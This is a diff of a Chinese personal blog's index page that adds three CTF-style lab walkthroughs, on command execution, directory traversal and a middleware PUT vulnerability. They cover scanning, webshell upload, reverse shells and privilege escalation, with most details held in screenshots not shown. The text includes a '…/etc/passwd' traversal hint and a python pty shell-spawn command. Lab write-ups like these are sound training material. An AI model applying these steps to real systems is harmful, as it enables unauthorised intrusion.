@@ -116,7 +116,7 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">22</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">24</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
@@ -126,7 +126,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">59</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">62</span></a>
 
   </li>
   </ul>
@@ -152,6 +152,350 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="北极星上的稻草人">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="北极星上的稻草人">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">命令执行漏洞</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-11-26 11:12:02 / 修改时间：11:12:28" itemprop="dateCreated datePublished" datetime="2021-11-26T11:12:02+08:00">2021-11-26</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h1><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101140937997.png" alt="image-20211101140937997"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101141003632.png" alt="image-20211101141003632"></p>
+<h3 id="步骤一：信息探测"><a href="#步骤一：信息探测" class="headerlink" title="步骤一：信息探测"></a>步骤一：信息探测</h3><p>这次使用图形化界面工具sparta（方法不唯一）</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101141540666.png" alt="image-20211101141540666"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101141635904.png" alt="image-20211101141635904"></p>
+<p>启动软件</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101141655651.png" alt="image-20211101141655651"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101141832697.png" alt="image-20211101141832697"></p>
+<p>软件会进行namp、nikto、screenshot扫描</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101142025402.png" alt="image-20211101142025402"></p>
+<p>点击下面的扫描模块就可以查看详情，也可以单独对某个端口进行扫描</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101142202492.png" alt="image-20211101142202492"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101142255859.png" alt="image-20211101142255859"></p>
+<p>还可以用dirt进行暴力探测</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101142339879.png" alt="image-20211101142339879"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101142645755.png" alt="image-20211101142645755"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101142844851.png" alt="image-20211101142844851"></p>
+<p>（这里展示的目录结果是没有探测完毕的，只是一部分）</p>
+<h3 id="步骤2：深入挖掘"><a href="#步骤2：深入挖掘" class="headerlink" title="步骤2：深入挖掘"></a>步骤2：深入挖掘</h3><p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101143032178.png" alt="image-20211101143032178"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101143039928.png" alt="image-20211101143039928"></p>
+<p>由dirt探测到的目录，发现了admin目录</p>
+<p>（先查看根目录）</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101143152281.png" alt="image-20211101143152281"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101143016291.png" alt="image-20211101143016291"></p>
+<p>由nikto探测，发现了/dev/敏感目录</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101143305976.png" alt="image-20211101143305976"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101143400181.png" alt="image-20211101143400181"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101143432624.png" alt="image-20211101143432624"></p>
+<p>对敏感页面，要查看源代码（注释，审计（输入界面）等等），如主页、登录界面、跳转的页面</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101144058602.png" alt="image-20211101144058602"></p>
+<p>/dev/界面</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101144346774.png" alt="image-20211101144346774"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101144544122.png" alt="image-20211101144544122"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101144758385.png" alt="image-20211101144758385"></p>
+<p>登录成功</p>
+<h3 id="步骤3：漏洞利用"><a href="#步骤3：漏洞利用" class="headerlink" title="步骤3：漏洞利用"></a>步骤3：漏洞利用</h3><p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101144916499.png" alt="image-20211101144916499"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101144943217.png" alt="image-20211101144943217"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101145031778.png" alt="image-20211101145031778"></p>
+<p>全扫描</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101145059553.png" alt="image-20211101145059553"></p>
+<p>扫描结果并没有发现高危漏洞或可直接利用的简单漏洞（对于需要登录的网站，不提供用户名和密码，只会扫描到登录前的界面）</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101145325404.png" alt="image-20211101145325404"></p>
+<p>再回头查看探测内容</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101145537120.png" alt="image-20211101145537120"></p>
+<p>由于我们登录成功了</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101145614993.png" alt="image-20211101145614993"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101145722635.png" alt="image-20211101145722635"></p>
+<h3 id="步骤4：反弹shell"><a href="#步骤4：反弹shell" class="headerlink" title="步骤4：反弹shell"></a>步骤4：反弹shell</h3><p>从步骤3结果可以知道，该网站以及上传了webshell；所以我们直接反弹shell即可</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101145854848.png" alt="image-20211101145854848"></p>
+<p>启动监听</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101145921584.png" alt="image-20211101145921584"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101150020356.png" alt="image-20211101150020356"></p>
+<p>回到kali就可以发现获取了shell</p>
+<p>返回终端</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101150130208.png" alt="image-20211101150130208"></p>
+<h3 id="步骤5：提权root权限"><a href="#步骤5：提权root权限" class="headerlink" title="步骤5：提权root权限"></a>步骤5：提权root权限</h3><p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101190231269.png" alt="image-20211101190231269"></p>
+<p>寻找可疑文件</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101150646707.png" alt="image-20211101150646707"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101150836715.png" alt="image-20211101150836715"></p>
+<p>（小编没看懂有什么用）</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101150932839.png" alt="image-20211101150932839"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101181541134.png" alt="image-20211101181541134"></p>
+<p>为什么是这个密码，小编也没看懂。</p>
+<p>提权</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101190112908.png" alt="image-20211101190112908"></p>
+<h3 id="步骤6：获取flag"><a href="#步骤6：获取flag" class="headerlink" title="步骤6：获取flag"></a>步骤6：获取flag</h3><p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211101190301542.png" alt="image-20211101190301542"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="北极星上的稻草人">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="北极星上的稻草人">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">目录遍历漏洞</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-11-26 11:11:11 / 修改时间：11:11:43" itemprop="dateCreated datePublished" datetime="2021-11-26T11:11:11+08:00">2021-11-26</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h1><h3 id="目录遍历漏洞介绍"><a href="#目录遍历漏洞介绍" class="headerlink" title="目录遍历漏洞介绍"></a>目录遍历漏洞介绍</h3><p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031145326806.png" alt="image-20211031145326806"></p>
+<p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031145407982.png" alt="image-20211031145407982"></p>
+<h4 id="步骤1：信息探测"><a href="#步骤1：信息探测" class="headerlink" title="步骤1：信息探测"></a>步骤1：信息探测</h4><p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031145509894.png" alt="image-20211031145509894"></p>
+<p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031145447840.png" alt="image-20211031145447840"></p>
+<p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031145810901.png" alt="image-20211031145810901"></p>
+<h4 id="步骤2：深入挖掘"><a href="#步骤2：深入挖掘" class="headerlink" title="步骤2：深入挖掘"></a>步骤2：深入挖掘</h4><p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031145606936.png" alt="image-20211031145606936"></p>
+<p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031145615519.png" alt="image-20211031145615519"></p>
+<p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031145845492.png" alt="image-20211031145845492"></p>
+<p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031145913903.png" alt="image-20211031145913903"></p>
+<h4 id="步骤3：漏洞扫描"><a href="#步骤3：漏洞扫描" class="headerlink" title="步骤3：漏洞扫描"></a>步骤3：漏洞扫描</h4><p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031145947445.png" alt="image-20211031145947445"></p>
+<p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031150111960.png" alt="image-20211031150111960"></p>
+<p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031150319083.png" alt="image-20211031150319083"></p>
+<p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031150529431.png" alt="image-20211031150529431"></p>
+<p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031150600534.png" alt="image-20211031150600534"></p>
+<p>由此可以知道，该网站是存在路径遍历漏洞的。于是利用该原理（…/etc/passwd）进行获取信息。</p>
+<h6 id="分析漏洞扫描结果（利用漏洞）"><a href="#分析漏洞扫描结果（利用漏洞）" class="headerlink" title="分析漏洞扫描结果（利用漏洞）"></a>分析漏洞扫描结果（利用漏洞）</h6><p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031150812168.png" alt="image-20211031150812168"></p>
+<h4 id="步骤4：敏感页面上传webshell"><a href="#步骤4：敏感页面上传webshell" class="headerlink" title="步骤4：敏感页面上传webshell"></a>步骤4：敏感页面上传webshell</h4><p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031152024169.png" alt="image-20211031152024169"></p>
+<p><strong>a.寻找并登录敏感页面</strong></p>
+<p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031151044287.png" alt="image-20211031151044287"></p>
+<p>b.<strong>查找可以利用的写webshell的点</strong></p>
+<p>一般是都是后台站点，这里用弱口令登录成功就进了数据库后台</p>
+<p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031151814888.png" alt="image-20211031151814888"></p>
+<p><strong>c.使用/usr/share/webshell/php/下的webshell</strong></p>
+<p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031151418332.png" alt="image-20211031151418332"></p>
+<p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031151536728.png" alt="image-20211031151536728"></p>
+<p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031151619899.png" alt="image-20211031151619899"></p>
+<p><strong>d.新建数据库，表，字段；上传并启动webshell</strong></p>
+<p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031152123371.png" alt="image-20211031152123371"></p>
+<p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031152205549.png" alt="image-20211031152205549"></p>
+<p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031152530658.png" alt="image-20211031152530658"></p>
+<p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031152618948.png" alt="image-20211031152618948"></p>
+<p>上面的define value值如下</p>
+<p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031152920720.png" alt="image-20211031152920720"></p>
+<p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031153043743.png" alt="image-20211031153043743"></p>
+<p>步骤5：监听并反弹shell </p>
+<p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031153148658.png" alt="image-20211031153148658"></p>
+<p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031152449254.png" alt="image-20211031152449254"></p>
+<p>启动监听</p>
+<p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031153136075.png" alt="image-20211031153136075"></p>
+<p>触发webshell</p>
+<p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031153301143.png" alt="image-20211031153301143"></p>
+<p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031153331763.png" alt="image-20211031153331763"></p>
+<p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031153513748.png" alt="image-20211031153513748"></p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><img src="/2021/11/26/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20211031153528845.png" alt="image-20211031153528845"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/11/26/%E4%B8%AD%E9%97%B4%E4%BB%B6PUT%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="北极星上的稻草人">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="北极星上的稻草人">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/11/26/%E4%B8%AD%E9%97%B4%E4%BB%B6PUT%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">中间件PUT漏洞</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-11-26 11:10:05 / 修改时间：11:10:54" itemprop="dateCreated datePublished" datetime="2021-11-26T11:10:05+08:00">2021-11-26</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="中间件PUT漏洞"><a href="#中间件PUT漏洞" class="headerlink" title="中间件PUT漏洞"></a>中间件PUT漏洞</h1><h3 id="中间件PUT漏洞介绍"><a href="#中间件PUT漏洞介绍" class="headerlink" title="中间件PUT漏洞介绍"></a>中间件PUT漏洞介绍</h3><p><img src="/2021/11/26/%E4%B8%AD%E9%97%B4%E4%BB%B6PUT%E6%BC%8F%E6%B4%9E/image-20211101190633407.png" alt="image-20211101190633407"></p>
+<p><img src="/2021/11/26/%E4%B8%AD%E9%97%B4%E4%BB%B6PUT%E6%BC%8F%E6%B4%9E/image-20211101190711037.png" alt="image-20211101190711037"></p>
+<h3 id="步骤1：信息探测"><a href="#步骤1：信息探测" class="headerlink" title="步骤1：信息探测"></a>步骤1：信息探测</h3><p><img src="/2021/11/26/%E4%B8%AD%E9%97%B4%E4%BB%B6PUT%E6%BC%8F%E6%B4%9E/image-20211101190813705.png" alt="image-20211101190813705"></p>
+<p><img src="/2021/11/26/%E4%B8%AD%E9%97%B4%E4%BB%B6PUT%E6%BC%8F%E6%B4%9E/image-20211101191127170.png" alt="image-20211101191127170"></p>
+<p><img src="/2021/11/26/%E4%B8%AD%E9%97%B4%E4%BB%B6PUT%E6%BC%8F%E6%B4%9E/image-20211101192439328.png" alt="image-20211101192439328"></p>
+<p><img src="/2021/11/26/%E4%B8%AD%E9%97%B4%E4%BB%B6PUT%E6%BC%8F%E6%B4%9E/image-20211101191209867.png" alt="image-20211101191209867"></p>
+<h3 id="步骤2：深入挖掘"><a href="#步骤2：深入挖掘" class="headerlink" title="步骤2：深入挖掘"></a>步骤2：深入挖掘</h3><p><img src="/2021/11/26/%E4%B8%AD%E9%97%B4%E4%BB%B6PUT%E6%BC%8F%E6%B4%9E/image-20211101191017554.png" alt="image-20211101191017554"></p>
+<p><img src="/2021/11/26/%E4%B8%AD%E9%97%B4%E4%BB%B6PUT%E6%BC%8F%E6%B4%9E/image-20211101191029331.png" alt="image-20211101191029331"></p>
+<p>（这里没有发现有用的东西）</p>
+<h3 id="步骤3：漏洞扫描"><a href="#步骤3：漏洞扫描" class="headerlink" title="步骤3：漏洞扫描"></a>步骤3：漏洞扫描</h3><p><img src="/2021/11/26/%E4%B8%AD%E9%97%B4%E4%BB%B6PUT%E6%BC%8F%E6%B4%9E/image-20211101192145310.png" alt="image-20211101192145310"></p>
+<p>启动</p>
+<p><img src="/2021/11/26/%E4%B8%AD%E9%97%B4%E4%BB%B6PUT%E6%BC%8F%E6%B4%9E/image-20211101192205795.png" alt="image-20211101192205795"></p>
+<p><img src="/2021/11/26/%E4%B8%AD%E9%97%B4%E4%BB%B6PUT%E6%BC%8F%E6%B4%9E/image-20211101192321798.png" alt="image-20211101192321798"></p>
+<p><img src="/2021/11/26/%E4%B8%AD%E9%97%B4%E4%BB%B6PUT%E6%BC%8F%E6%B4%9E/image-20211101192350669.png" alt="image-20211101192350669"></p>
+<p>（这里也没有发现一些特别有用的信息）</p>
+<h4 id="测试PUT漏洞"><a href="#测试PUT漏洞" class="headerlink" title="测试PUT漏洞"></a>测试PUT漏洞</h4><p><img src="/2021/11/26/%E4%B8%AD%E9%97%B4%E4%BB%B6PUT%E6%BC%8F%E6%B4%9E/image-20211101192654900.png" alt="image-20211101192654900"></p>
+<p>制作webshell</p>
+<p><img src="/2021/11/26/%E4%B8%AD%E9%97%B4%E4%BB%B6PUT%E6%BC%8F%E6%B4%9E/image-20211101192846917.png" alt="image-20211101192846917"></p>
+<p><img src="/2021/11/26/%E4%B8%AD%E9%97%B4%E4%BB%B6PUT%E6%BC%8F%E6%B4%9E/image-20211101193010519.png" alt="image-20211101193010519"></p>
+<h3 id="步骤4：上传webshell"><a href="#步骤4：上传webshell" class="headerlink" title="步骤4：上传webshell"></a>步骤4：上传webshell</h3><p><img src="/2021/11/26/%E4%B8%AD%E9%97%B4%E4%BB%B6PUT%E6%BC%8F%E6%B4%9E/image-20211101194033989.png" alt="image-20211101194033989"></p>
+<p>python -c  “ import pty;pty.spawn(‘/bin/bash’)”;图片出少了“/”</p>
+<p><img src="/2021/11/26/%E4%B8%AD%E9%97%B4%E4%BB%B6PUT%E6%BC%8F%E6%B4%9E/image-20211101193136053.png" alt="image-20211101193136053"></p>
+<p><img src="/2021/11/26/%E4%B8%AD%E9%97%B4%E4%BB%B6PUT%E6%BC%8F%E6%B4%9E/image-20211101193306697.png" alt="image-20211101193306697"></p>
+<p><img src="/2021/11/26/%E4%B8%AD%E9%97%B4%E4%BB%B6PUT%E6%BC%8F%E6%B4%9E/image-20211101193321252.png" alt="image-20211101193321252"></p>
+<p>启动监听</p>
+<p><img src="/2021/11/26/%E4%B8%AD%E9%97%B4%E4%BB%B6PUT%E6%BC%8F%E6%B4%9E/image-20211101193451427.png" alt="image-20211101193451427"></p>
+<p>触发webshell</p>
+<p><img src="/2021/11/26/%E4%B8%AD%E9%97%B4%E4%BB%B6PUT%E6%BC%8F%E6%B4%9E/image-20211101193521178.png" alt="image-20211101193521178"></p>
+<p><img src="/2021/11/26/%E4%B8%AD%E9%97%B4%E4%BB%B6PUT%E6%BC%8F%E6%B4%9E/image-20211101193622565.png" alt="image-20211101193622565"></p>
+<p>启动终端</p>
+<p><img src="/2021/11/26/%E4%B8%AD%E9%97%B4%E4%BB%B6PUT%E6%BC%8F%E6%B4%9E/image-20211101193703601.png" alt="image-20211101193703601"></p>
